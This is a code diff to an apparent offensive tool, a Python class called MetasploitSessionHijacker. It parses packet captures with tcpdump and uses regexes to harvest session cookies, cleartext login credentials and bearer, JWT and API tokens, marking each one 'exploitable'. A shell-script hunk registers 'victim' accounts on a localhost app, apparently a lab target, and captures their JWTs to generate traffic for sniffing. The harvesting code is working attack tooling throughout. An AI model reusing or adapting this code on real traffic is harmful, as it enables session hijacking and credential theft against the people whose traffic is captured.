@@ -81,74 +81,63 @@ class MetasploitSessionHijacker:
         print("[*] Extracting session cookies from HTTP traffic...")
         
         try:
-            # Extract cookies using tshark
+            # Extract HTTP traffic using tcpdump (more reliable than tshark)
             result = subprocess.run([
-                'tshark', '-r', self.pcap_file, '-Y', 'http', '-T', 'fields',
-                '-e', 'ip.src', '-e', 'ip.dst', '-e', 'http.cookie', 
-                '-e', 'http.set_cookie', '-e', 'http.host', '-e', 'http.request.uri'
+                'sudo', 'tcpdump', '-r', self.pcap_file, '-A', '-s', '0'
             ], capture_output=True, text=True, timeout=30)
             
-            lines = result.stdout.strip().split('\n')
+            traffic = result.stdout
+            
             cookie_count = 0
             
-            for line in lines:
-                if not line.strip():
-                    continue
-                    
-                fields = line.split('\t')
-                if len(fields) < 4:
-                    continue
-                
-                src_ip, dst_ip, req_cookie, set_cookie = fields[0], fields[1], fields[2], fields[3]
-                
-                # Process request cookies
-                if req_cookie:
-                    for cookie in req_cookie.split(';'):
-                        cookie = cookie.strip()
-                        if '=' in cookie:
-                            name, value = cookie.split('=', 1)
-                            cookie_data = {
-                                'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
-                                'type': 'request',
-                                'name': name.strip(),
-                                'value': value.strip(),
-                                'source_ip': src_ip,
-                                'dest_ip': dst_ip,
-                                'exploitable': True,
-                                'msf_rating': 'Excellent'
-                            }
-                            self.cookies.append(cookie_data)
-                            cookie_count += 1
-                            print(f"[+] Cookie captured: {name} from {src_ip}")
-                
-                # Process Set-Cookie headers
-                if set_cookie:
-                    if '=' in set_cookie:
-                        parts = set_cookie.split(';')[0]
-                        if '=' in parts:
-                            name, value = parts.split('=', 1)
-                            flags = {
-                                'secure': 'secure' in set_cookie.lower(),
-                                'httponly': 'httponly' in set_cookie.lower(),
-                                'samesite': 'samesite' in set_cookie.lower()
-                            }
-                            
-                            cookie_data = {
-                                'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
-                                'type': 'response',
-                                'name': name.strip(),
-                                'value': value.strip()[:50],
-                                'source_ip': dst_ip,
-                                'dest_ip': src_ip,
-                                'flags': flags,
-                                'exploitable': not flags['secure'] and not flags['httponly'],
-                                'msf_rating': 'Excellent' if not any(flags.values()) else 'Good'
-                            }
-                            self.cookies.append(cookie_data)
-                            cookie_count += 1
-                            
-                            if cookie_data['exploitable']:
-                                print(f"[+] EXPLOITABLE cookie found: {name} (no security flags)")
+            # Look for Cookie: headers in requests
+            cookie_matches = re.finditer(r'Cookie:\s*([^\r\n]+)', traffic, re.IGNORECASE)
+            for match in cookie_matches:
+                cookie_line = match.group(1)
+                for cookie in cookie_line.split(';'):
+                    cookie = cookie.strip()
+                    if '=' in cookie:
+                        name, value = cookie.split('=', 1)
+                        cookie_data = {
+                            'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
+                            'type': 'request',
+                            'name': name.strip(),
+                            'value': value.strip()[:50],
+                            'exploitable': True,
+                            'msf_rating': 'Excellent'
+                        }
+                        self.cookies.append(cookie_data)
+                        cookie_count += 1
+                        print(f"[+] Cookie captured: {name}")
+            
+            # Look for Set-Cookie: headers in responses
+            setcookie_matches = re.finditer(r'Set-Cookie:\s*([^\r\n]+)', traffic, re.IGNORECASE)
+            for match in setcookie_matches:
+                set_cookie = match.group(1)
+                if '=' in set_cookie:
+                    parts = set_cookie.split(';')[0]
+                    if '=' in parts:
+                        name, value = parts.split('=', 1)
+                        flags = {
+                            'secure': 'secure' in set_cookie.lower(),
+                            'httponly': 'httponly' in set_cookie.lower(),
+                            'samesite': 'samesite' in set_cookie.lower()
+                        }
+                        
+                        cookie_data = {
+                            'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
+                            'type': 'response',
+                            'name': name.strip(),
+                            'value': value.strip()[:50],
+                            'flags': flags,
+                            'exploitable': not flags['secure'] and not flags['httponly'],
+                            'msf_rating': 'Excellent' if not any(flags.values()) else 'Good'
+                        }
+                        self.cookies.append(cookie_data)
+                        cookie_count += 1
+                        
+                        if cookie_data['exploitable']:
+                            print(f"[+] EXPLOITABLE cookie found: {name} (no security flags)")
                             
             print(f"[+] auxiliary/scanner/http/cookie_capture completed")
             print(f"[+] Total cookies captured: {cookie_count}")
@@ -166,47 +155,41 @@ class MetasploitSessionHijacker:
         print("[*] Sniffing for credentials in HTTP traffic...")
         
         try:
-            # Extract POST data with potential credentials
+            # Extract HTTP traffic using tcpdump
             result = subprocess.run([
-                'tshark', '-r', self.pcap_file, 
-                '-Y', 'http.request.method == "POST"',
-                '-T', 'fields', '-e', 'ip.src', '-e', 'http.host',
-                '-e', 'http.request.uri', '-e', 'http.file_data'
+                'sudo', 'tcpdump', '-r', self.pcap_file, '-A', '-s', '0'
             ], capture_output=True, text=True, timeout=30)
             
-            lines = result.stdout.strip().split('\n')
+            traffic = result.stdout
             cred_count = 0
             
-            for line in lines:
-                if not line.strip():
-                    continue
+            # Look for POST requests with credentials
+            post_blocks = re.finditer(r'POST\s+([^\s]+).*?(?=\n\n|\nGET|\nPOST|$)', traffic, re.DOTALL | re.IGNORECASE)
+            
+            for match in post_blocks:
+                block = match.group(0)
                 
                 # Look for password-related strings
-                if any(keyword in line.lower() for keyword in ['password', 'passwd', 'pwd', 'email', 'username', 'login']):
-                    fields = line.split('\t')
-                    if len(fields) >= 4:
-                        src_ip, host, uri, data = fields[0], fields[1], fields[2], fields[3]
-                        
-                        # Extract credentials
-                        email_match = re.search(r'["\']?email["\']?\s*[:=]\s*["\']?([^"\'&,\s]+)', data, re.IGNORECASE)
-                        pass_match = re.search(r'["\']?pass(?:word|wd)?["\']?\s*[:=]\s*["\']?([^"\'&,\s]+)', data, re.IGNORECASE)
-                        user_match = re.search(r'["\']?user(?:name)?["\']?\s*[:=]\s*["\']?([^"\'&,\s]+)', data, re.IGNORECASE)
-                        
-                        if email_match or pass_match or user_match:
-                            cred = {
-                                'source_ip': src_ip,
-                                'host': host,
-                                'endpoint': uri,
-                                'username': email_match.group(1) if email_match else user_match.group(1) if user_match else 'N/A',
-                                'password': pass_match.group(1) if pass_match else 'N/A',
-                                'captured_at': datetime.now().isoformat(),
-                                'msf_rating': 'Excellent - Cleartext credentials'
-                            }
-                            self.credentials.append(cred)
-                            cred_count += 1
-                            print(f"[+] CREDENTIALS CAPTURED from {src_ip}:")
-                            print(f"    Username: {cred['username']}")
-                            print(f"    Password: {'*' * len(cred['password']) if cred['password'] != 'N/A' else 'N/A'}")
+                if any(keyword in block.lower() for keyword in ['password', 'passwd', 'pwd', 'email', 'username', 'login']):
+                    # Extract credentials
+                    email_match = re.search(r'["\']?email["\']?\s*[:=]\s*["\']?([^"\'&,\s\}]+)', block, re.IGNORECASE)
+                    pass_match = re.search(r'["\']?pass(?:word|wd)?["\']?\s*[:=]\s*["\']?([^"\'&,\s\}]+)', block, re.IGNORECASE)
+                    user_match = re.search(r'["\']?user(?:name)?["\']?\s*[:=]\s*["\']?([^"\'&,\s\}]+)', block, re.IGNORECASE)
+                    uri_match = re.search(r'POST\s+([^\s]+)', block)
+                    
+                    if email_match or pass_match or user_match:
+                        cred = {
+                            'endpoint': uri_match.group(1) if uri_match else 'Unknown',
+                            'username': email_match.group(1) if email_match else user_match.group(1) if user_match else 'N/A',
+                            'password': pass_match.group(1) if pass_match else 'N/A',
+                            'captured_at': datetime.now().isoformat(),
+                            'msf_rating': 'Excellent - Cleartext credentials'
+                        }
+                        self.credentials.append(cred)
+                        cred_count += 1
+                        print(f"[+] CREDENTIALS CAPTURED:")
+                        print(f"    Username: {cred['username']}")
+                        print(f"    Password: {'*' * min(len(cred['password']), 10) if cred['password'] != 'N/A' else 'N/A'}")
             
             print(f"[+] auxiliary/sniffer/psnuffle completed")
             print(f"[+] Credentials captured: {cred_count}")
@@ -223,59 +206,46 @@ class MetasploitSessionHijacker:
         print("[*] Hunting for authentication tokens...")
         
         try:
-            # Extract URLs and authorization headers
+            # Extract HTTP traffic using tcpdump
             result = subprocess.run([
-                'tshark', '-r', self.pcap_file, '-Y', 'http', '-T', 'fields',
-                '-e', 'http.authorization', '-e', 'http.request.uri',
-                '-e', 'ip.src', '-e', 'http.host'
+                'sudo', 'tcpdump', '-r', self.pcap_file, '-A', '-s', '0'
             ], capture_output=True, text=True, timeout=30)
             
-            lines = result.stdout.strip().split('\n')
+            traffic = result.stdout
             token_count = 0
             
             # Token patterns (JWT, Bearer, API keys, etc.)
             token_patterns = [
-                (r'bearer\s+([A-Za-z0-9\-_\.]+)', 'Bearer Token'),
+                (r'Bearer\s+([A-Za-z0-9\-_\.]+)', 'Bearer Token'),
                 (r'token=([A-Za-z0-9\-_\.]+)', 'URL Token'),
                 (r'jwt=([A-Za-z0-9\-_\.]+)', 'JWT Token'),
                 (r'api[_-]?key=([A-Za-z0-9\-_\.]+)', 'API Key'),
                 (r'auth=([A-Za-z0-9\-_\.]+)', 'Auth Token'),
                 (r'session=([A-Za-z0-9\-_\.]+)', 'Session Token'),
-                (r'access[_-]?token=([A-Za-z0-9\-_\.]+)', 'Access Token')
+                (r'access[_-]?token=([A-Za-z0-9\-_\.]+)', 'Access Token'),
+                (r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*', 'JWT Token')
             ]
             
-            for line in lines:
-                if not line.strip():
-                    continue
-                
-                fields = line.split('\t')
-                if len(fields) < 2:
-                    continue
-                
-                auth_header = fields[0] if len(fields) > 0 else ''
-                uri = fields[1] if len(fields) > 1 else ''
-                src_ip = fields[2] if len(fields) > 2 else ''
-                
-                combined = f"{auth_header} {uri}"
-                
-                for pattern, token_type in token_patterns:
-                    matches = re.findall(pattern, combined, re.IGNORECASE)
-                    for match in matches:
-                        token = {
-                            'type': token_type,
-                            'value': match[:40] + '...' if len(match) > 40 else match,
-                            'full_value': match,
-                            'source_ip': src_ip,
-                            'length': len(match),
-                            'entropy': len(set(match)),  # Simple entropy
-                            'exploitable': True,
-                            'msf_rating': 'Excellent - Token in cleartext'
-                        }
-                        self.tokens.append(token)
-                        token_count += 1
-                        print(f"[+] TOKEN CAPTURED: {token_type} from {src_ip}")
-                        print(f"    Value: {token['value']}")
-                        print(f"    Length: {token['length']} chars, Entropy: {token['entropy']}")
+            # Search for tokens in traffic
+            for pattern, token_type in token_patterns:
+                matches = re.finditer(pattern, traffic, re.IGNORECASE)
+                for match in matches:
+                    token_value = match.group(1) if match.groups() else match.group(0)
+                    
+                    token = {
+                        'type': token_type,
+                        'value': token_value[:40] + '...' if len(token_value) > 40 else token_value,
+                        'full_value': token_value,
+                        'length': len(token_value),
+                        'entropy': len(set(token_value)),  # Simple entropy
+                        'exploitable': True,
+                        'msf_rating': 'Excellent - Token in cleartext'
+                    }
+                    self.tokens.append(token)
+                    token_count += 1
+                    print(f"[+] TOKEN CAPTURED: {token_type}")
+                    print(f"    Value: {token['value']}")
+                    print(f"    Length: {token['length']} chars, Entropy: {token['entropy']}")
             
             print(f"[+] auxiliary/scanner/http/token_hunter completed")
             print(f"[+] Tokens captured: {token_count}")
@@ -539,17 +509,45 @@ if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
     curl -s "http://$TARGET:3003/rest/products/search?q=" > /dev/null 2>&1 || true
     sleep 1
     
-    # Stage 2: Multiple authentication attempts (captures login flow)
-    echo "[*] Stage 2: Authentication attempts..." | tee -a "$OUTPUT_FILE"
-    for i in {1..5}; do
-        RESPONSE=$(curl -s -c /tmp/msf_cookies_${TIMESTAMP}.txt -w "%{http_code}" \
-            "http://$TARGET:3003/rest/user/login" \
+    # Stage 2: Register and authenticate test users (captures login flow with real tokens)
+    echo "[*] Stage 2: Registering victims and capturing authentication..." | tee -a "$OUTPUT_FILE"
+    
+    # Register multiple test users
+    for i in {1..3}; do
+        VICTIM_EMAIL="msfvictim${i}-${TIMESTAMP}@hijack.test"
+        VICTIM_PASS="Hijack${i}Pass!"
+        
+        # Register user
+        curl -s -X POST "http://$TARGET:3003/api/Users/" \
             -H "Content-Type: application/json" \
-            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
-            -d "{\"email\":\"user${i}@example.com\",\"password\":\"password${i}\"}" \
-            2>/dev/null || echo "000")
-        echo "    [*] Login attempt ${i}: HTTP ${RESPONSE##*$'\n'}" | tee -a "$OUTPUT_FILE"
+            -d "{\"email\":\"${VICTIM_EMAIL}\",\"password\":\"${VICTIM_PASS}\",\"passwordRepeat\":\"${VICTIM_PASS}\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"blue\"}" \
+            > /dev/null 2>&1 || true
         sleep 1
+        
+        # Login and capture JWT token
+        TOKEN_RESPONSE=$(curl -s -X POST "http://$TARGET:3003/rest/user/login" \
+            -H "Content-Type: application/json" \
+            -H "User-Agent: MSFVictim${i}" \
+            -d "{\"email\":\"${VICTIM_EMAIL}\",\"password\":\"${VICTIM_PASS}\"}" \
+            2>/dev/null || echo "{}")
+        
+        # Extract token for use in subsequent requests
+        TOKEN=$(echo "$TOKEN_RESPONSE" | grep -o '"token":"[^"]*"' | cut -d'"' -f4 || echo "")
+        
+        if [ ! -z "$TOKEN" ]; then
+            echo "    [+] Victim ${i} authenticated - JWT token captured" | tee -a "$OUTPUT_FILE"
+            
+            # Make authenticated requests with Bearer token
+            for j in {1..3}; do
+                curl -s "http://$TARGET:3003/rest/products/search?q=victim${i}req${j}" \
+                    -H "Authorization: Bearer ${TOKEN}" \
+                    -H "User-Agent: MSFVictim${i}" \
+                    > /dev/null 2>&1 || true
+                sleep 1
+            done
+        else
+            echo "    [-] Victim ${i} authentication failed" | tee -a "$OUTPUT_FILE"
+        fi
     done
     
     # Stage 3: Session activity with cookies
